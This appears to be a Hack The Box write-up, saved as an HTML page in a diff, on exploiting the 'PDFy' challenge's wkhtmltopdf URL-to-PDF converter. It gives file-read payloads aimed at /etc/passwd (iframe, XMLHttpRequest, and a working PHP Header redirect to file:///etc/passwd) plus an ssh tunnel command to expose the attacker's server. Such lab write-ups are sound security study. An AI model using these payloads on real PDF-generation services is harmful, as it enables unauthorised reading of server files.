@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PDFy</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">PDFy</h1>
+<p class="spacing-64" \>
+
+<p class="spacing-64" \>
+
+
+<p>
+This website has an input box that generates a PDF from a website! We can test
+it fast just by typing <a href="https://google.com/">https://google.com/</a>:
+</p>
+
+
+<div id="org3513c0d" class="figure">
+<p><img src="writeup-img/2025-01-06_21-56-47_screenshot.png" alt="2025-01-06_21-56-47_screenshot.png" />
+</p>
+</div>
+
+<p>
+Works pretty well. What if we just input some random non-existing website, like
+<a href="https://gjrioaegjio.greajgrae/">https://gjrioaegjio.greajgrae/</a> ? An interesting popup appears and disappears
+kind of fast on top of the page:
+</p>
+
+
+
+<div id="org9c4c6ad" class="figure">
+<p><img src="writeup-img/2025-01-06_21-58-17_screenshot.png" alt="2025-01-06_21-58-17_screenshot.png" />
+</p>
+</div>
+
+<p>
+So this web application is just using <code>wkhtmltopdf</code> to convert websites to PDF.
+Naturally, I was curious about the types of exploits using this program and I
+found out that there are known <a href="https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/">file inclusion vulnerabilities</a>. And oh boy,
+wasn't this extremely annoying to exploit&#x2026; I first started with a simple HTML
+file with some common payloads to try and exploit this:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-keyword">!DOCTYPE</span> html&gt;
+&lt;<span class="org-function-name">html</span> <span class="org-variable-name">lang</span>=<span class="org-string">"en"</span>&gt;
+
+&lt;<span class="org-function-name">head</span>&gt;
+  &lt;<span class="org-function-name">meta</span> <span class="org-variable-name">charset</span>=<span class="org-string">"utf-8"</span>&gt;
+  &lt;<span class="org-function-name">meta</span> <span class="org-variable-name">name</span>=<span class="org-string">"viewport"</span> <span class="org-variable-name">content</span>=<span class="org-string">"width=device-width, initial-scale=1"</span>&gt;
+  &lt;<span class="org-function-name">title</span>&gt;<span class="org-underline"><span class="org-bold">HTML5 Boilerplate</span></span>&lt;/<span class="org-function-name">title</span>&gt;
+  &lt;<span class="org-function-name">link</span> <span class="org-variable-name">rel</span>=<span class="org-string">"stylesheet"</span> <span class="org-variable-name">href</span>=<span class="org-string">"styles.css"</span>&gt;
+&lt;/<span class="org-function-name">head</span>&gt;
+
+&lt;<span class="org-function-name">body</span>&gt;
+  &lt;<span class="org-function-name">h1</span>&gt;<span class="org-underline"><span class="org-bold">Page Title</span></span>&lt;/<span class="org-function-name">h1</span>&gt;
+
+    <span class="org-comment-delimiter">&lt;!-- </span><span class="org-comment">didnt work</span><span class="org-comment-delimiter"> --&gt;</span>
+    &lt;<span class="org-function-name">div</span>&gt;
+      &lt;<span class="org-function-name">p</span>&gt;Report Heading&lt;/<span class="org-function-name">p</span>&gt;
+      &lt;<span class="org-function-name">iframe</span> <span class="org-variable-name">src</span>=<span class="org-string">"file:///etc/passwd"</span> <span class="org-variable-name">height</span>=<span class="org-string">"500"</span> <span class="org-variable-name">width</span>=<span class="org-string">"500"</span>&gt;
+      &lt;/<span class="org-function-name">iframe</span>&gt;
+    &lt;/<span class="org-function-name">div</span>&gt;
+
+    <span class="org-comment-delimiter">&lt;!-- </span><span class="org-comment">didnt work</span><span class="org-comment-delimiter"> --&gt;</span>
+  &lt;<span class="org-function-name">script</span>&gt;
+    x=new XMLHttpRequest;
+    x.onload=function(){
+    document.write(this.responseText)
+    };
+    x.open("GET","file:///etc/passwd");
+    x.send();
+  &lt;/<span class="org-function-name">script</span>&gt;
+&lt;/<span class="org-function-name">body</span>&gt;
+
+&lt;/<span class="org-function-name">html</span>&gt;
+</pre>
+</div>
+
+<p>
+Before continuing, here's the thing&#x2026; to actually make it work well, we have to
+use some tunneling service so we can expose our <code>localhost</code> service to the
+internet. So I ended using <code>localhost.run</code> to tunnel the server, be it a Python
+server or PHP server, by using the following command:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">ssh -R 80:localhost:8000 localhost.run
+</pre>
+</div>
+
+<p>
+And I am mentioning PHP because nothing worked with the code above. So I fired
+up a PHP server with the usual PHP code to try and read files:
+<code>get_file_contents("/etc/passwd")</code>, or even <code>include("/etc/passwd")</code>. And they
+actually worked, but the <code>/etc/passwd</code> file that was showing was <b>my</b> own file! But
+then, by scrubbing for more information, I found out that the PHP <code>header</code>
+function could be the solution, since it evaluates the file differently, and
+will actually fetch the one from the HTB server:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;PHP Test&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;?php
+        Header("location:file:///etc/passwd");
+    ?&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+</div>
+
+<p>
+And <i>voilá</i>:
+</p>
+
+
+<div id="org8fb4f34" class="figure">
+<p><img src="writeup-img/2025-01-07_00-22-12_screenshot.png" alt="2025-01-07_00-22-12_screenshot.png" />
+</p>
+</div>
+
+<p>
+The flag is not shown, but it's in that exact file.
+</p>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">07-01-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
